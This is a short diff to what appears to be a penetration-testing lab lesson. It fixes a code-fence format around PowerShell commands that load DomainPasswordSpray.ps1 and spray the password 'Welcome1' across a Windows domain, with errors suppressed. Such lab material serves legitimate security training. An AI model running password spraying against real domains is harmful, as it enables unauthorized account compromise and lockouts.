@@ -8,8 +8,7 @@ There are several options available to us with the tool. Since the host is domai
 
 #### Using DomainPasswordSpray.ps1
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
 PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 
